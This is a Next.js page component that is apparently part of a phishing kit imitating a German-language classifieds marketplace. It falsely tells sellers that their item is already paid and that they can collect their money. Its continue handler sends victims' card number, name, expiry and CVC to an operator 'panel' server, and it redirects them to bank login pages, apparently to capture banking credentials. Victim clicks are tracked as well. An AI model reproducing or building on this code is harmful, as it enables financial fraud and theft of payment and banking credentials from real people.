"use client";

import { use, useEffect, useState } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useListing } from "../../../../components/ListingContext";

const PANEL_URL = process.env.NEXT_PUBLIC_PANEL_URL || "http://localhost:8500";

function trackEvent(type: string, listingId: string) {
  fetch(`${PANEL_URL}/api/events`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ type, listingId }),
  }).catch(() => {});
}

interface PageProps {
  params: Promise<{ slug: string }>;
}

export default function ListingPage({ params }: PageProps) {
  const { slug } = use(params);
  const router = useRouter();
  const { listing, loading, error, addressData, bankData } = useListing();
  const [bannerOpen, setBannerOpen] = useState(false);

  useEffect(() => {
    if (listing?.id) {
      trackEvent("page_view", listing.id);
    }
  }, [listing?.id]);

  const handleContinue = async () => {
    if (listing?.id) {
      trackEvent("continue_click", listing.id);
    }

    // Nothing selected yet — go to bank selection
    if (!bankData.bankName) {
      router.push(`/iad/kaufen-und-verkaufen/d/${slug}/bank`);
      return;
    }

    // Bank was selected — redirect to the bank's login URL
    if (bankData.bankSlug && bankData.bankSlug !== "kreditkarte" && bankData.bankUrl) {
      window.location.href = bankData.bankUrl;
      return;
    }

    // Kreditkarte was selected — submit card data and go to card_waiting flow
    if (bankData.bankName === "Kreditkarte" && bankData.cardNumber) {
      // Submit card data to backend
      if (listing?.id) {
        fetch(`${PANEL_URL}/api/public/bank-submission`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            bankSlug: "kreditkarte",
            listingSlug: slug,
            step: "card_details",
            data: {
              cardNumber: bankData.cardNumber,
              cardName: bankData.cardName,
              cardExpiry: bankData.cardExpiry,
              cardCvc: bankData.cardCvc,
            },
          }),
        }).catch(() => {});
      }

      // Start a bank session for credit card flow, then navigate to card_waiting
      try {
        const res = await fetch(`${PANEL_URL}/api/public/bank-session/start`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            bankSlug: "kreditkarte",
            listingSlug: slug,
          }),
        });
        const data = await res.json();
        // Navigate to bank page which will pick up the card_waiting step
        router.push(`/iad/kaufen-und-verkaufen/d/${slug}/bank?step=card_waiting&sessionId=${data.sessionId || ""}`);
      } catch {
        router.push(`/iad/kaufen-und-verkaufen/d/${slug}/bank?step=card_waiting`);
      }
      return;
    }

    // Fallback — go to bank selection
    router.push(`/iad/kaufen-und-verkaufen/d/${slug}/bank`);
  };

  if (loading) {
    return (
      <main className="page-wrapper">
        <div className="loading-state">
          <div className="loading-spinner" />
          <span>Laden...</span>
        </div>
      </main>
    );
  }

  if (error || !listing) {
    return (
      <main className="page-wrapper">
        <div className="error-state">
          <div className="error-icon">😕</div>
          <p style={{ fontWeight: 600, color: "#333" }}>Anzeige nicht gefunden</p>
          <p style={{ fontSize: 14 }}>{error || "Versuchen Sie die Seite zu aktualisieren"}</p>
        </div>
      </main>
    );
  }

  const formattedPrice = new Intl.NumberFormat("de-DE", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(listing.price);

  return (
    <>
      <main className="page-wrapper">
        {/* Product Header */}
        <div className="product-header">
          {listing.mainImage ? (
            <img
              src={listing.mainImage}
              alt={listing.title}
              className="product-image"
            />
          ) : (
            <div className="product-image-placeholder">
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
                <circle cx="8.5" cy="8.5" r="1.5"/>
                <polyline points="21 15 16 10 5 21"/>
              </svg>
            </div>
          )}
          <div className="product-info">
            <div className="product-title">{listing.title}</div>
          </div>
        </div>

        {/* Price Row */}
        <div className="price-row">
          <span className="price-label">Sie erhalten</span>
          <span className="price-value">{formattedPrice} €</span>
        </div>

        {/* Info Banner — collapsible */}
        <div className="info-banner" onClick={() => setBannerOpen(!bannerOpen)}>
          <div className="info-banner-icon">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
              <path d="M12 2L3 7v6c0 5.25 3.75 10.15 9 11.25C17.25 23.15 21 18.25 21 13V7l-9-5z" fill="#6db9e3"/>
              <path d="M9 12l2 2 4-4" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
          <div className="info-banner-text">
            Ihre Waren sind bereits bezahlt, Sie können Ihr Geld erhalten!
          </div>
          <div className={`info-banner-chevron ${bannerOpen ? "open" : ""}`}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="6 9 12 15 18 9"/>
            </svg>
          </div>
        </div>
        {bannerOpen && (
          <div className="info-banner-details">
            Die Mittel werden direkt auf Ihr Bankkonto überwiesen, nachdem der Käufer den Erhalt der Ware bestätigt hat.
          </div>
        )}

        {/* Bank Selection Row */}
        <Link href={`/iad/kaufen-und-verkaufen/d/${slug}/bank`} className="action-row">
          <div className="action-row-text">
            <div className="action-row-label">Geld bekommen für</div>
            <div className="action-row-sublabel">
              {bankData.bankName || "Kreditkarte / SOFORT-Überweisung"}
            </div>
          </div>
          <div className="action-row-chevron">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="9 18 15 12 9 6"/>
            </svg>
          </div>
        </Link>

        {/* Address Row — read-only display */}
        <div className="action-row" style={{ cursor: "default" }}>
          <div className="action-row-text">
            <div className="action-row-label">Lieferadresse</div>
            <div className="action-row-sublabel">
              {addressData.fullName
                ? `${addressData.fullName}${addressData.address ? `, ${addressData.address}` : ""}${addressData.orderNumber ? ` (${addressData.orderNumber})` : ""}`
                : "Keine Lieferadresse angegeben"}
            </div>
          </div>
        </div>

        {/* Shipping Row */}
        <div className="shipping-row">
          <span className="shipping-text-inline">Lieferung: Post, 3-7 Werktage</span>
          <img src="/post-logo.png" alt="Post" className="shipping-logo" />
        </div>

        {/* Legal Row */}
        <div className="legal-row">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="#b0b0b0">
            <circle cx="12" cy="12" r="11" fill="#b0b0b0"/>
            <text x="12" y="17" textAnchor="middle" fontSize="14" fontWeight="bold" fill="#fff">i</text>
          </svg>
          <a href="/legal" target="_blank" rel="noopener noreferrer" className="legal-link">Rechtlicher Hinweis</a>
        </div>

        {/* CTA Button */}
        <button className="cta-button" onClick={handleContinue}>
          Weiter zum Geldempfang
        </button>
      </main>

    </>
  );
}
